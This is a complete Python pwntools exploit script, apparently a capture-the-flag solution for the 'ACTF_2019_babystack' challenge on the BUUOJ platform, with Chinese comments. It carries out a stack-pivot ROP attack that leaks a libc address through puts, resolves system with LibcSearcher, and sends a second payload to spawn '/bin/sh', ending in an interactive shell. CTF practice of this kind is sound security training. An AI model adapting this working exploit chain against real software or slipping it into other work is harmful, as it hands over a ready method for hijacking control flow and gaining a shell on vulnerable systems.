from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'ACTF_2019_babystack'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
stack pivot
0x0000000000400ad3 : pop rdi ; ret
'''

io.sendlineafter("How many bytes of your message?\n>", str(0xE0))
msg = io.recvline(timeout=5)
buf_addr = msg[-15:-1]
buf_addr = int(buf_addr.decode(), 16)
LOG_ADDR_SUCCESS('buf_addr', buf_addr)

io.recvuntil('>')

# 首先利用puts将函数地址泄露出来
payload = p64(0) # fake_ebp2
payload += p64(0x400ad3) + p64(io_elf.got['read']) # pop rdi
payload += p64(io_elf.plt['puts'])
payload += p64(0x4008f6) # main
payload += b'a' * (0xd0 - len(payload))
payload += p64(buf_addr)
payload += p64(0x400a18)
io.send(payload)

io.recvuntil('Byebye~\n')
leak_addr = io.recv(6)
read_addr = u64(leak_addr.ljust(8, b'\x00'))
libc = LibcSearcher('read', read_addr)
libc_base_addr = read_addr - libc.dump('read')
system_addr = libc_base_addr + libc.dump('system')
LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('system_addr', system_addr)
io.sendlineafter('>', '224')
msg = io.recvline()
buf_addr = msg[-15:-1]
buf_addr = int(buf_addr.decode(), 16)
LOG_ADDR_SUCCESS('buf_addr', buf_addr)

io.recvuntil('>')
payload = b'/bin/sh\x00' 
payload += p64(0)# fake_ebp2
payload += p64(0x400ad3) + p64(buf_addr) # pop rdi
payload += p64(system_addr)
payload += b'a' * (0xd0 - len(payload))
payload += p64(buf_addr + 8)
payload += p64(0x400a18)
io.send(payload)


io.interactive()
